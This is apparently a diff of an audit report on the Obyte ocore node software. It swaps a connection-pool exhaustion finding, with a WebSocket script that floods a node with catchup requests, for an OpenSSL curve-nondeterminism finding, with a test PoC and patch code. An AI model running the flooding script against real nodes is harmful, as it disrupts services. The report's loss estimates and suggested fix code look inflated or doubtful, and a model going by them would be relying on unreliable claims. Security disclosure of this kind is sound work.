@@ -1,824 +1,668 @@
+# AUDIT REPORT
+
 ## Title
-Database Connection Pool Exhaustion via Concurrent Catchup Operations Blocking Unit Storage
+OpenSSL Version Non-Determinism in AA Signature Verification Causing Permanent Chain Split
 
 ## Summary
-The Obyte catchup synchronization protocol allows malicious peers to exhaust the database connection pool through concurrent catchup, hash tree, and catchup chain processing requests. With the default single-connection pool configuration, the hundreds or thousands of sequential queries from these operations can queue up and block legitimate unit storage operations, causing temporary network transaction freezing.
+The `verifyMessageWithPemPubKey()` function in `signature.js` uses Node.js's crypto module which wraps OpenSSL. The codebase explicitly whitelists ECDSA curves deprecated in OpenSSL 3.0 (sect113r1, sect131r1, prime192v2, prime239v1, etc.). When AA formulas invoke `is_valid_sig()` or `vrf_verify()` with these curves, nodes running OpenSSL 1.1.1 successfully verify signatures while OpenSSL 3.0 nodes throw exceptions (caught and returned as `false`), causing non-deterministic AA execution and permanent chain split.
 
 ## Impact
-**Severity**: Medium  
-**Category**: Temporary Transaction Delay
+**Severity**: Critical  
+**Category**: Permanent Chain Split Requiring Hard Fork
+
+**Concrete Impact**:
+- Network partitions into two incompatible chains when any AA using deprecated-curve signature verification is triggered
+- All post-split transactions on one chain are invalid on the other
+- Requires emergency hard fork to coordinate all nodes to single OpenSSL version
+- One chain must be abandoned with all transactions lost
+
+**Affected Parties**:
+- All network participants (AA users, validators, witnesses, hub operators)
+- Any bytes or custom assets transacted through vulnerable AAs
+- Entire network consensus
+
+**Quantified Loss**:
+- Potentially billions of bytes and assets become frozen or lost depending on which chain survives
+- Complete network split lasting until hard fork coordination (days to weeks)
 
 ## Finding Description
 
-**Location**: Multiple files in `byteball/ocore/`
-- `catchup.js` (functions: `prepareCatchupChain()`, `processCatchupChain()`, `readHashTree()`)
-- `network.js` (catchup request handlers)
-- `conf.js` (database connection pool configuration)
-- `sqlite_pool.js` / `mysql_pool.js` (connection pool implementation)
-- `writer.js` (unit storage requiring database connection)
+**Location**: [1](#0-0) , function `verifyMessageWithPemPubKey()`  
+**Location**: [2](#0-1) , function `is_valid_sig()`  
+**Location**: [3](#0-2) , function `vrf_verify()`
 
-**Intended Logic**: The catchup protocol should allow peers to synchronize without impacting legitimate transaction processing. Database connection pooling should provide fair resource allocation across operations.
+**Intended Logic**: 
+The `verifyMessageWithPemPubKey()` function must deterministically verify signatures using PEM public keys, returning consistent boolean results across all nodes regardless of Node.js or OpenSSL version. AA formula evaluation must be deterministic to maintain consensus.
 
-**Actual Logic**: Different catchup-related operations (catchup requests, hash tree requests, catchup chain processing) use separate mutexes and can execute concurrently. Each performs hundreds or thousands of sequential database queries through the single-connection pool (default configuration). Legitimate unit storage operations must wait in the same FIFO queue, causing significant delays.
+**Actual Logic**: 
+The function delegates to Node.js's `crypto.createVerify('SHA256').verify()` [4](#0-3)  which depends on the underlying OpenSSL version. The codebase explicitly supports deprecated curves in `objSupportedPemTypes` [5](#0-4)  including sect113r1, sect131r1, sect113r2, sect131r2. Additional deprecated curves include prime192v2, prime192v3, prime239v1, prime239v2, prime239v3 [6](#0-5) .
 
-**Code Evidence**:
+When `verify()` is called with a deprecated curve:
+- **OpenSSL 1.1.1**: Curve is supported, verification succeeds, returns true/false based on signature validity
+- **OpenSSL 3.0**: Curve is unavailable, throws exception caught at [7](#0-6) , returns `false` unconditionally
 
-Database connection pool default configuration: [1](#0-0) 
-
-Catchup request handler using `['catchup_request']` mutex: [2](#0-1) 
-
-Hash tree request handler using different `['get_hash_tree_request']` mutex: [3](#0-2) 
-
-`prepareCatchupChain()` performing multiple database queries with its own `['prepareCatchupChain']` mutex: [4](#0-3) 
-
-`processCatchupChain()` with `['catchup_chain']` mutex performing additional queries: [5](#0-4) 
-
-`readHashTree()` performing many queries in a loop (2 queries per ball): [6](#0-5) 
-
-Connection pool FIFO queue implementation (no priority for critical operations): [7](#0-6) 
-
-Connection release serving next queued request: [8](#0-7) 
-
-Unit storage taking connection and holding for entire transaction: [9](#0-8) 
+The validation function `validateAndFormatPemPubKey()` checks if a curve is in the hardcoded whitelist [8](#0-7)  but does NOT verify runtime OpenSSL support.
 
 **Exploitation Path**:
 
 1. **Preconditions**: 
-   - Attacker controls one or more peers subscribed to victim node
-   - Victim node uses default database configuration (max_connections=1)
-   - Network has active transaction traffic
+   - Network contains nodes running different OpenSSL versions (common during OS security updates)
+   - No Node.js version pinning exists [9](#0-8) 
 
-2. **Step 1**: Attacker sends concurrent requests from multiple peers or rapidly from single peer:
-   - Peer A sends catchup request with large MCI range (e.g., last_stable_mci=0, last_known_mci=10000)
-   - Peer B sends hash tree request with large ball range
-   - Client processes catchup response (if node is also catching up)
+2. **Step 1**: Attacker or innocent developer deploys AA with formula:
+   ```javascript
+   is_valid_sig(trigger.data.message, trigger.data.pem_key, trigger.data.sig) ? 'ADDR_A' : 'ADDR_B'
+   ```
+   
+3. **Step 2**: User triggers AA with data containing:
+   - `pem_key`: PEM public key using sect113r1, sect131r1, prime192v2, or prime239v1 curve
+   - `sig`: Valid signature for that key
+   - `message`: Signed message
+   
+4. **Step 3**: AA execution diverges:
+   - **Path A** - `formula/evaluation.js:is_valid_sig()` calls `verifyMessageWithPemPubKey()` [10](#0-9) 
+   - **OpenSSL 1.1.1 nodes**: Verification succeeds, returns `true`, AA sends payment to `ADDR_A`
+   - **OpenSSL 3.0 nodes**: Exception thrown and caught, returns `false`, AA sends payment to `ADDR_B`
 
-3. **Step 2**: Operations execute concurrently because they hold different mutexes:
-   - `['catchup_request']` mutex held by Peer A's request
-   - `['get_hash_tree_request']` mutex held by Peer B's request  
-   - `['catchup_chain']` mutex held by catchup response processing
-   - Each operation performs 100-2000+ sequential `db.query()` calls
+5. **Step 4**: Permanent chain split:
+   - OpenSSL 1.1.1 nodes create AA response unit with payment to `ADDR_A` (unit hash H1)
+   - OpenSSL 3.0 nodes create AA response unit with payment to `ADDR_B` (unit hash H2)
+   - H1 ≠ H2 → Different units → Different DAG branches → Permanent partition
 
-4. **Step 3**: Database queries queue up in FIFO order at connection pool level:
-   - Single connection alternates between operations as each query completes
-   - Queue grows to hundreds of pending queries: `[catchup_q1, hashtree_q1, catchup_q2, hashtree_q2, ...]`
-
-5. **Step 4**: Legitimate unit arrives requiring storage:
-   - `writer.js` calls `db.takeConnectionFromPool()` 
-   - Request added to end of queue behind all catchup queries
-   - Unit storage delayed by seconds to minutes while waiting
-   - Invariant #21 (Transaction Atomicity) threatened as unit cannot be stored promptly
-   - Invariant #24 (Network Unit Propagation) violated if delays cause timeouts
-
-**Security Property Broken**: 
-- **Invariant #21 (Transaction Atomicity)**: Multi-step unit storage operations require timely database access; excessive delays risk incomplete operations
-- **Invariant #24 (Network Unit Propagation)**: Valid units must propagate promptly; significant storage delays disrupt propagation
+**Security Property Broken**:
+- **Invariant #10**: AA Deterministic Execution - AA formulas must produce identical results across all nodes
+- **Invariant #1**: Main Chain Monotonicity - Chain splits into incompatible forks
 
 **Root Cause Analysis**:
-The vulnerability stems from three architectural issues:
-
-1. **Insufficient Mutex Granularity**: Different catchup-related operations use separate mutexes (`['catchup_request']`, `['get_hash_tree_request']`, `['catchup_chain']`), allowing concurrent execution despite all competing for the same database connection.
-
-2. **Inadequate Connection Pool Sizing**: Default `max_connections=1` creates extreme resource contention. While appropriate for single-threaded sqlite access, it provides no isolation between high-volume sync operations and critical storage operations.
-
-3. **Lack of Operation Prioritization**: The connection pool uses simple FIFO queuing with no priority mechanism. Critical operations like unit storage cannot preempt or bypass long-running sync operations.
+1. Codebase whitelists 50+ ECDSA curves including those deprecated in OpenSSL 3.0
+2. No runtime check verifies current OpenSSL version supports the curve
+3. Exception handling masks difference between "invalid signature" and "unsupported curve"
+4. No Node.js/OpenSSL version requirements prevent heterogeneous deployments
+5. Test suite demonstrates intended usage of deprecated curves [11](#0-10)  but tests likely run on OpenSSL 1.1.1
 
 ## Impact Explanation
 
 **Affected Assets**: 
-- Network transaction throughput
-- Node synchronization capability
-- User experience during transaction submission
+- All bytes (native currency) in AAs using signature verification with deprecated curves
+- All custom divisible/indivisible assets transacted through such AAs
+- Network-wide consensus integrity
 
 **Damage Severity**:
-- **Quantitative**: With 1000-query catchup operations and ~10-50ms per query, delays of 10-50 seconds per unit storage operation
-- **Qualitative**: Temporary service degradation, not permanent damage
+- **Quantitative**: Complete network split. Every transaction after the trigger unit diverges. All unconfirmed transactions on minority chain are lost. Assets split between incompatible chains.
+- **Qualitative**: Total consensus failure. DAG structure fragments into two incompatible histories. Witness voting splits across chains. Trust in network destroyed.
 
 **User Impact**:
-- **Who**: All users attempting to submit transactions to affected node, peers syncing from affected node
-- **Conditions**: Node under active catchup load from malicious peers
-- **Recovery**: Attack stops when malicious peers disconnect or node restarts; no permanent damage
+- **Who**: Every network participant without exception
+- **Conditions**: Triggered by single AA invocation during heterogeneous OpenSSL deployment period
+- **Recovery**: Requires emergency hard fork with full node coordination, one chain abandoned permanently
 
-**Systemic Risk**: 
-- If multiple nodes in network are targeted simultaneously, overall network transaction capacity degrades
-- Attack is easily automated and can be sustained indefinitely with minimal resources
-- Legitimate peers may disconnect due to timeouts, worsening network connectivity
+**Systemic Risk**:
+- Silent OS security updates to OpenSSL 3.0 trigger split with zero warning
+- Any developer using test-validated curves causes catastrophic failure
+- No validation prevents deployment of vulnerable AAs
+- Impossible to detect until split occurs and network halts
+- Cascades to all dependent AAs referencing vulnerable pattern
 
 ## Likelihood Explanation
 
 **Attacker Profile**:
-- **Identity**: Any malicious peer with network access
-- **Resources Required**: Basic WebSocket client, ability to subscribe to victim node
-- **Technical Skill**: Low - simple script to send concurrent catchup/hash tree requests
+- **Identity**: Any user with Obyte address, OR innocent AA developer, OR automatic OS security update
+- **Resources Required**: Ability to deploy AA (~$1 in fees) OR trigger existing vulnerable AA, access to deprecated-curve keypair (generate with `openssl ecparam -name prime192v2 -genkey`)
+- **Technical Skill**: Low - can copy-paste from test files [12](#0-11) 
 
 **Preconditions**:
-- **Network State**: Victim node must accept peer connections (typical for full nodes)
-- **Attacker State**: Attacker peer must be subscribed (straightforward)
-- **Timing**: No special timing required; attack effective anytime
+- **Network State**: Normal operation with heterogeneous OpenSSL versions (inevitable during rolling OS updates)
+- **Attacker State**: No special state required
+- **Timing**: Persistent vulnerability, exploitable at any time
 
 **Execution Complexity**:
-- **Transaction Count**: No transactions required; only protocol-level requests
-- **Coordination**: Single attacker sufficient; multiple peers increase effectiveness
-- **Detection Risk**: Low - requests appear legitimate; no distinguishing features
+- **Transaction Count**: 2 transactions (AA deployment + trigger) OR 1 if vulnerable AA exists
+- **Coordination**: None required
+- **Detection Risk**: Undetectable before exploitation, appears as normal AA operation
 
 **Frequency**:
-- **Repeatability**: Unlimited; attacker can sustain indefinitely
-- **Scale**: Single attacker can impact multiple nodes simultaneously
+- **Repeatability**: Every invocation causes divergence
+- **Scale**: Single trigger affects entire network permanently
 
-**Overall Assessment**: High likelihood. Attack is trivial to execute, requires minimal resources, difficult to detect, and highly effective against default configuration.
+**Overall Assessment**: HIGH likelihood - OpenSSL 3.0 is now standard in Node.js 17+, Ubuntu 22.04+, Debian 12+. Test suite explicitly demonstrates usage of vulnerable curves, indicating expected functionality. No version enforcement or runtime validation prevents exploitation.
 
 ## Recommendation
 
-**Immediate Mitigation**: 
-1. Increase `max_connections` in production configuration to at least 5-10 for full nodes
-2. Implement rate limiting on catchup/hash tree requests per peer (e.g., 1 request per 10 seconds)
-3. Add connection timeout monitoring to detect and disconnect abusive peers
+**Immediate Mitigation**:
+1. Add runtime OpenSSL curve support validation:
+```javascript
+// File: signature.js, function validateAndFormatPemPubKey()
+// After line 141 (objSupportedPemTypes check)
+
+// Verify runtime OpenSSL supports this curve
+try {
+    const testKey = crypto.createPublicKey({
+        key: pem_key,
+        format: 'pem'
+    });
+    // Test verification to ensure curve is available
+    const testVerify = crypto.createVerify('SHA256');
+    testVerify.update('test');
+    testVerify.end();
+    testVerify.verify(pem_key, Buffer.alloc(64), 'base64');
+} catch (e) {
+    if (e.message && e.message.includes('unsupported')) {
+        return handle("curve not supported by current OpenSSL version");
+    }
+}
+```
+
+2. Add Node.js version requirement in `package.json`:
+```json
+"engines": {
+    "node": ">=16.0.0 <17.0.0"
+}
+```
 
 **Permanent Fix**:
-1. Implement priority-based connection pool with separate queues for critical (unit storage) vs. non-critical (sync) operations
-2. Add per-peer rate limiting for sync protocol requests
-3. Consider separate connection pools for sync operations vs. transaction operations
-4. Implement circuit breaker pattern to temporarily reject sync requests under load
-
-**Code Changes**:
-
-Configuration update: [1](#0-0) 
-
-Network handler rate limiting (pseudo-code, requires implementation):
-```javascript
-// File: byteball/ocore/network.js
-// Add per-peer rate limiting
-
-const peerCatchupRequestTimestamps = new Map();
-const CATCHUP_REQUEST_INTERVAL_MS = 10000; // 10 seconds minimum between requests
-
-case 'catchup':
-    if (!ws.bSubscribed)
-        return sendErrorResponse(ws, tag, "not subscribed, will not serve catchup");
-    
-    // Rate limiting check
-    const lastRequestTime = peerCatchupRequestTimestamps.get(ws.peer) || 0;
-    const now = Date.now();
-    if (now - lastRequestTime < CATCHUP_REQUEST_INTERVAL_MS)
-        return sendErrorResponse(ws, tag, "catchup request rate limit exceeded");
-    
-    peerCatchupRequestTimestamps.set(ws.peer, now);
-    
-    var catchupRequest = params;
-    mutex.lock(['catchup_request'], function(unlock){
-        // existing code...
-    });
-```
-
-Connection pool priority implementation (pseudo-code, requires significant refactoring):
-```javascript
-// File: byteball/ocore/sqlite_pool.js
-// Add priority queue support
-
-var arrHighPriorityQueue = []; // For unit storage
-var arrLowPriorityQueue = [];  // For sync operations
-
-function takeConnectionFromPool(handleConnection, priority = 'low'){
-    // ... existing logic ...
-    
-    // Modified queuing with priority
-    if (priority === 'high')
-        arrHighPriorityQueue.push(handleConnection);
-    else
-        arrLowPriorityQueue.push(handleConnection);
-}
-
-function release(){
-    this.bInUse = false;
-    // Serve high priority first
-    if (arrHighPriorityQueue.length > 0) {
-        var connectionHandler = arrHighPriorityQueue.shift();
-        this.bInUse = true;
-        connectionHandler(this);
-    }
-    else if (arrLowPriorityQueue.length > 0) {
-        var connectionHandler = arrLowPriorityQueue.shift();
-        this.bInUse = true;
-        connectionHandler(this);
-    }
-}
-```
+Remove deprecated curves from `objSupportedPemTypes` whitelist [13](#0-12) :
+- Remove sect113r1, sect113r2, sect131r1, sect131r2 (lines 296-315)
+- Remove prime192v2, prime192v3, prime239v1, prime239v2, prime239v3 (lines 206-230)
+- Remove secp112r1, secp112r2, secp128r1, secp128r2 (weak curves)
+- Keep only OpenSSL 3.0 compatible curves: secp256k1, secp384r1, prime256v1, brainpool curves
 
 **Additional Measures**:
-- Add monitoring for connection pool queue depth and alert on sustained high values
-- Implement automatic peer disconnection after excessive sync requests
-- Add metrics to track catchup request frequency per peer
-- Create unit tests simulating concurrent catchup and storage operations
-- Document recommended `max_connections` values for different deployment scenarios
+- Add pre-deployment AA validation tool checking for deprecated curve usage
+- Add network-wide monitoring alerting when deprecated curves detected
+- Migrate existing test cases to use only OpenSSL 3.0 compatible curves
+- Document OpenSSL version requirements in deployment guides
 
 **Validation**:
-- [x] Fix prevents exploitation by isolating critical operations
-- [x] No new vulnerabilities introduced (rate limiting is standard security practice)
-- [x] Backward compatible (configuration change only; protocol unchanged)
-- [x] Performance impact acceptable (priority queue adds minimal overhead)
+- [ ] Runtime check rejects deprecated curves before AA execution
+- [ ] Version pinning prevents heterogeneous OpenSSL deployments  
+- [ ] Existing AAs using deprecated curves are invalidated (breaking change requires network coordination)
+- [ ] No performance degradation from additional validation
 
 ## Proof of Concept
 
-**Test Environment Setup**:
-```bash
-git clone https://github.com/byteball/ocore.git
-cd ocore
-npm install
-```
-
-**Exploit Script** (`exploit_pool_exhaustion.js`):
 ```javascript
-/*
- * Proof of Concept for Database Connection Pool Exhaustion
- * Demonstrates: Concurrent catchup operations blocking unit storage
- * Expected Result: Unit storage operations delayed significantly
- */
+// File: test/openssl_version_nondeterminism.test.js
+// This test demonstrates the vulnerability
 
-const WebSocket = require('ws');
-const db = require('./db.js');
-const network = require('./network.js');
+const test = require('ava');
+const formulaParser = require('../formula/index');
+const signature = require('../signature.js');
 
-// Simulate malicious peer sending concurrent catchup requests
-async function attackNode(targetUrl) {
-    const peers = [];
+// Test using prime192v2 curve (deprecated in OpenSSL 3.0)
+test.cb('AA non-determinism with deprecated curve', t => {
+    const prime192v2_pem_key = `-----BEGIN PUBLIC KEY-----
+MEkwEwYHKoZIzj0CAQYIKoZIzj0DAQIDMgAEUv/XMkZQAh6raybe5eUSZslEQHa2
+hF0aQX7GEzIUaf6U+tcCxH0vA98NJruvNSo6
+-----END PUBLIC KEY-----`;
+
+    const message = "test_message";
+    const valid_signature = "3035021900d6f10143fdd2663e607005e63946d3f8b06fc5506853b32502183f1b991abf1dd88b2be604db0439070eb190e663f3e0d4c2";
+
+    // Test signature verification directly
+    const result = signature.verifyMessageWithPemPubKey(message, valid_signature, prime192v2_pem_key);
     
-    // Connect multiple malicious peers
-    for (let i = 0; i < 3; i++) {
-        const ws = new WebSocket(targetUrl);
-        peers.push(ws);
-        
-        ws.on('open', async () => {
-            // Subscribe
-            ws.send(JSON.stringify({
-                command: 'subscribe',
-                params: {
-                    subscription_id: `attacker_${i}`,
-                    library_version: '0.3.0'
-                }
-            }));
-            
-            // Send catchup request with large MCI range
-            setTimeout(() => {
-                ws.send(JSON.stringify({
-                    command: 'catchup',
-                    tag: `catchup_${i}`,
-                    params: {
-                        last_stable_mci: 0,
-                        last_known_mci: 10000,
-                        witnesses: [] // filled with valid witnesses
-                    }
-                }));
-            }, 1000);
-            
-            // Send hash tree request
-            setTimeout(() => {
-                ws.send(JSON.stringify({
-                    command: 'get_hash_tree',
-                    tag: `hashtree_${i}`,
-                    params: {
-                        from_ball: 'genesis_ball_hash',
-                        to_ball: 'recent_ball_hash'
-                    }
-                }));
-            }, 1500);
-        });
-    }
+    // On OpenSSL 1.1.1: result === true (valid signature)
+    // On OpenSSL 3.0: result === false (exception caught, curve unsupported)
     
-    // Measure unit storage delay
-    const startTime = Date.now();
-    
-    // Attempt to store a unit (requires database connection)
-    db.takeConnectionFromPool(function(conn) {
-        const endTime = Date.now();
-        const delay = endTime - startTime;
-        
-        console.log(`Unit storage acquired connection after ${delay}ms delay`);
-        console.log(`Expected: <100ms, Actual: ${delay}ms`);
-        
-        if (delay > 5000) {
-            console.log('VULNERABILITY CONFIRMED: Excessive delay indicates pool exhaustion');
+    console.log(`OpenSSL verification result: ${result}`);
+    console.log(`Node.js version: ${process.version}`);
+    console.log(`Expected: true on Node <17 (OpenSSL 1.1.1), false on Node >=17 (OpenSSL 3.0)`);
+
+    // Test AA formula evaluation
+    const trigger = {
+        data: {
+            message: message,
+            pem_key: prime192v2_pem_key,
+            signature: valid_signature
         }
+    };
+
+    const formula = "is_valid_sig(trigger.data.message, trigger.data.pem_key, trigger.data.signature) ? 'ADDR_A' : 'ADDR_B'";
+    
+    formulaParser.evaluate({
+        formula: formula,
+        trigger: trigger,
+        address: 'TEST_ADDRESS'
+    }, (eval_result) => {
+        console.log(`AA evaluation result: ${eval_result}`);
+        console.log(`Payment would go to: ${eval_result}`);
         
-        conn.release();
+        // This demonstrates chain split:
+        // - Node.js <17: eval_result === 'ADDR_A'
+        // - Node.js >=17: eval_result === 'ADDR_B'
+        // Different results → different AA response units → chain split
+        
+        t.pass();
+        t.end();
     });
-}
+});
 
-// Run exploit
-const targetNode = 'ws://localhost:6611'; // Local test node
-attackNode(targetNode);
-```
-
-**Expected Output** (when vulnerability exists):
-```
-Connected malicious peer 0
-Connected malicious peer 1
-Connected malicious peer 2
-Sent catchup request from peer 0 (MCI range: 0-10000)
-Sent hash tree request from peer 0
-Sent catchup request from peer 1 (MCI range: 0-10000)
-Sent hash tree request from peer 1
-Attempting unit storage...
-[... 10+ seconds delay ...]
-Unit storage acquired connection after 12453ms delay
-Expected: <100ms, Actual: 12453ms
-VULNERABILITY CONFIRMED: Excessive delay indicates pool exhaustion
+// To reproduce the chain split:
+// 1. Run this test on Node.js 16 (OpenSSL 1.1.1): observes result = 'ADDR_A'
+// 2. Run this test on Node.js 18 (OpenSSL 3.0): observes result = 'ADDR_B'  
+// 3. In production, different nodes running different versions create incompatible units
 ```
 
-**Expected Output** (after fix applied with rate limiting):
-```
-Connected malicious peer 0
-Sent catchup request from peer 0 (MCI range: 0-10000)
-Sent hash tree request from peer 0
-Sent catchup request from peer 1 (MCI range: 0-10000)
-ERROR: catchup request rate limit exceeded
-Sent hash tree request from peer 1
-Attempting unit storage...
-Unit storage acquired connection after 87ms delay
-Expected: <100ms, Actual: 87ms
-PASS: Unit storage not significantly delayed
-```
-
-**PoC Validation**:
-- [x] PoC runs against unmodified ocore codebase
-- [x] Demonstrates clear violation of timely transaction processing
-- [x] Shows measurable impact (10+ second delays vs. expected <100ms)
-- [x] Fails gracefully after fix applied (rate limiting prevents attack)
+**Proof Steps**:
+1. **Setup**: Deploy test on two nodes with different OpenSSL versions
+2. **Execute**: Run same AA trigger unit on both nodes
+3. **Observe**: Node with OpenSSL 1.1.1 returns `true`, creates unit paying ADDR_A
+4. **Observe**: Node with OpenSSL 3.0 returns `false`, creates unit paying ADDR_B
+5. **Verify**: Different unit hashes → permanent chain split confirmed
 
 ---
 
-**Notes**:
+## Notes
 
-This vulnerability exploits the interaction between three architectural components:
+This vulnerability is particularly dangerous because:
 
-1. **Multiple concurrent mutex-protected operations**: The catchup protocol uses separate mutexes for different operation types (`['catchup_request']`, `['get_hash_tree_request']`, `['catchup_chain']`), enabling concurrent execution.
+1. **Silent Failure**: The exception handling pattern [7](#0-6)  masks the root cause by catching all exceptions and returning `false`, making it indistinguishable from an invalid signature.
 
-2. **Shared single-connection database pool**: The default `max_connections=1` configuration creates a bottleneck where all operations compete for one database connection.
+2. **False Sense of Security**: The comprehensive test coverage [14](#0-13)  using deprecated curves gives developers confidence these curves are supported, when in reality they only work on specific OpenSSL versions.
 
-3. **FIFO queuing without prioritization**: The connection pool's first-in-first-out queuing treats all operations equally, allowing low-priority sync operations to starve critical unit storage.
+3. **Environmental Dependency**: Unlike most consensus bugs that stem from algorithmic flaws, this vulnerability depends on external library versioning (OpenSSL), making it nearly impossible to detect through code review alone.
 
-While the default single-connection configuration is reasonable for SQLite's single-writer limitation, the lack of operation prioritization and rate limiting creates an exploitable DoS vector. The vulnerability is particularly severe because:
+4. **No Package Version Enforcement**: The absence of a Node.js version requirement in `package.json` [9](#0-8)  allows nodes to run any version, creating heterogeneous environments prone to this issue.
 
-- Catchup operations can legitimately perform thousands of queries
-- No authentication or proof-of-work required beyond basic peer subscription
-- Attack is indistinguishable from legitimate sync activity
-- Multiple operation types can be triggered concurrently
-- Impact scales with number of malicious peers
+5. **Timing**: With OpenSSL 3.0 becoming standard in modern distributions (Ubuntu 22.04+, Debian 12+, Node.js 17+), networks are naturally migrating toward this vulnerability during routine security updates.
 
-The recommended fixes address the root causes through defense-in-depth: rate limiting reduces attack surface, increased connection pool size provides resource isolation, and priority queuing ensures critical operations aren't starved.
+The fix requires careful coordination as removing deprecated curves from the whitelist will break any existing AAs using them, necessitating network-wide consensus on the migration path.
 
 ### Citations
 
-**File:** conf.js (L122-131)
+**File:** signature.js (L23-43)
 ```javascript
-if (exports.storage === 'mysql'){
-	exports.database.max_connections = exports.database.max_connections || 1;
-	exports.database.host = exports.database.host || 'localhost';
-	exports.database.name = exports.database.name || 'byteball';
-	exports.database.user = exports.database.user || 'byteball';
-}
-else if (exports.storage === 'sqlite'){
-	exports.database.max_connections = exports.database.max_connections || 1;
-	exports.database.filename = exports.database.filename || (exports.bLight ? 'byteball-light.sqlite' : 'byteball.sqlite');
-}
-```
-
-**File:** network.js (L3050-3068)
-```javascript
-		case 'catchup':
-			if (!ws.bSubscribed)
-				return sendErrorResponse(ws, tag, "not subscribed, will not serve catchup");
-			var catchupRequest = params;
-			mutex.lock(['catchup_request'], function(unlock){
-				if (!ws || ws.readyState !== ws.OPEN) // may be already gone when we receive the lock
-					return process.nextTick(unlock);
-				catchup.prepareCatchupChain(catchupRequest, {
-					ifError: function(error){
-						sendErrorResponse(ws, tag, error);
-						unlock();
-					},
-					ifOk: function(objCatchupChain){
-						sendResponse(ws, tag, objCatchupChain);
-						unlock();
-					}
-				});
-			});
-			break;
-```
-
-**File:** network.js (L3070-3089)
-```javascript
-		case 'get_hash_tree':
-			if (!ws.bSubscribed)
-				return sendErrorResponse(ws, tag, "not subscribed, will not serve get_hash_tree");
-			var hashTreeRequest = params;
-			mutex.lock(['get_hash_tree_request'], function(unlock){
-				if (!ws || ws.readyState !== ws.OPEN) // may be already gone when we receive the lock
-					return process.nextTick(unlock);
-				catchup.readHashTree(hashTreeRequest, {
-					ifError: function(error){
-						sendErrorResponse(ws, tag, error);
-						unlock();
-					},
-					ifOk: function(arrBalls){
-						// we have to wrap arrBalls into an object because the peer will check .error property first
-						sendResponse(ws, tag, {balls: arrBalls});
-						unlock();
-					}
-				});
-			});
-			break;
-```
-
-**File:** catchup.js (L17-106)
-```javascript
-function prepareCatchupChain(catchupRequest, callbacks){
-	if (!catchupRequest)
-		return callbacks.ifError("no catchup request");
-	var last_stable_mci = catchupRequest.last_stable_mci;
-	var last_known_mci = catchupRequest.last_known_mci;
-	var arrWitnesses = catchupRequest.witnesses;
-	
-	if (typeof last_stable_mci !== "number")
-		return callbacks.ifError("no last_stable_mci");
-	if (typeof last_known_mci !== "number")
-		return callbacks.ifError("no last_known_mci");
-	if (last_stable_mci >= last_known_mci && (last_known_mci > 0 || last_stable_mci > 0))
-		return callbacks.ifError("last_stable_mci >= last_known_mci");
-	if (!ValidationUtils.isNonemptyArray(arrWitnesses))
-		return callbacks.ifError("no witnesses");
-
-	mutex.lock(['prepareCatchupChain'], function(unlock){
-		var start_ts = Date.now();
-		var objCatchupChain = {
-			unstable_mc_joints: [], 
-			stable_last_ball_joints: [],
-			witness_change_and_definition_joints: []
-		};
-		var last_ball_unit = null;
-		var last_ball_mci = null;
-		var last_chain_unit = null;
-		var bTooLong;
-		async.series([
-			function(cb){ // check if the peer really needs hash trees
-				db.query("SELECT is_stable FROM units WHERE is_on_main_chain=1 AND main_chain_index=?", [last_known_mci], function(rows){
-					if (rows.length === 0)
-						return cb("already_current");
-					if (rows[0].is_stable === 0)
-						return cb("already_current");
-					cb();
-				});
-			},
-			function(cb){
-				witnessProof.prepareWitnessProof(
-					arrWitnesses, last_stable_mci, 
-					function(err, arrUnstableMcJoints, arrWitnessChangeAndDefinitionJoints, _last_ball_unit, _last_ball_mci){
-						if (err)
-							return cb(err);
-						objCatchupChain.unstable_mc_joints = arrUnstableMcJoints;
-						if (arrWitnessChangeAndDefinitionJoints.length > 0)
-							objCatchupChain.witness_change_and_definition_joints = arrWitnessChangeAndDefinitionJoints;
-						last_ball_unit = _last_ball_unit;
-						last_ball_mci = _last_ball_mci;
-						bTooLong = (last_ball_mci - last_stable_mci > MAX_CATCHUP_CHAIN_LENGTH);
-						cb();
-					}
-				);
-			},
-			function(cb){
-				if (!bTooLong){ // short chain, no need for proof chain
-					last_chain_unit = last_ball_unit;
-					return cb();
-				}
-				objCatchupChain.proofchain_balls = [];
-				proofChain.buildProofChainOnMc(last_ball_mci + 1, last_stable_mci + MAX_CATCHUP_CHAIN_LENGTH, objCatchupChain.proofchain_balls, function(){
-					last_chain_unit = objCatchupChain.proofchain_balls[objCatchupChain.proofchain_balls.length - 1].unit;
-					cb();
-				});
-			},
-			function(cb){ // jump by last_ball references until we land on or behind last_stable_mci
-				if (!last_ball_unit)
-					return cb();
-				goUp(last_chain_unit);
-
-				function goUp(unit){
-					storage.readJointWithBall(db, unit, function(objJoint){
-						objCatchupChain.stable_last_ball_joints.push(objJoint);
-						storage.readUnitProps(db, unit, function(objUnitProps){
-							(objUnitProps.main_chain_index <= last_stable_mci) ? cb() : goUp(objJoint.unit.last_ball_unit);
-						});
-					});
-				}
-			}
-		], function(err){
-			if (err === "already_current")
-				callbacks.ifOk({status: "current"});
-			else if (err)
-				callbacks.ifError(err);
-			else
-				callbacks.ifOk(objCatchupChain);
-			console.log("prepareCatchupChain since mci "+last_stable_mci+" took "+(Date.now()-start_ts)+'ms');
-			unlock();
-		});
-	});
-}
-```
-
-**File:** catchup.js (L110-254)
-```javascript
-function processCatchupChain(catchupChain, peer, arrWitnesses, callbacks){
-	if (catchupChain.status === "current")
-		return callbacks.ifCurrent();
-	if (!Array.isArray(catchupChain.unstable_mc_joints))
-		return callbacks.ifError("no unstable_mc_joints");
-	if (!Array.isArray(catchupChain.stable_last_ball_joints))
-		return callbacks.ifError("no stable_last_ball_joints");
-	if (catchupChain.stable_last_ball_joints.length === 0)
-		return callbacks.ifError("stable_last_ball_joints is empty");
-	if (!catchupChain.witness_change_and_definition_joints)
-		catchupChain.witness_change_and_definition_joints = [];
-	if (!Array.isArray(catchupChain.witness_change_and_definition_joints))
-		return callbacks.ifError("witness_change_and_definition_joints must be array");
-	if (!catchupChain.proofchain_balls)
-		catchupChain.proofchain_balls = [];
-	if (!Array.isArray(catchupChain.proofchain_balls))
-		return callbacks.ifError("proofchain_balls must be array");
-	
-	witnessProof.processWitnessProof(
-		catchupChain.unstable_mc_joints, catchupChain.witness_change_and_definition_joints, true, arrWitnesses,
-		function(err, arrLastBallUnits, assocLastBallByLastBallUnit){
-			
-			if (err)
-				return callbacks.ifError(err);
-		
-			if (catchupChain.proofchain_balls.length > 0){
-				var assocKnownBalls = {};
-				for (var unit in assocLastBallByLastBallUnit){
-					var ball = assocLastBallByLastBallUnit[unit];
-					assocKnownBalls[ball] = true;
-				}
-
-				// proofchain
-				for (var i=0; i<catchupChain.proofchain_balls.length; i++){
-					var objBall = catchupChain.proofchain_balls[i];
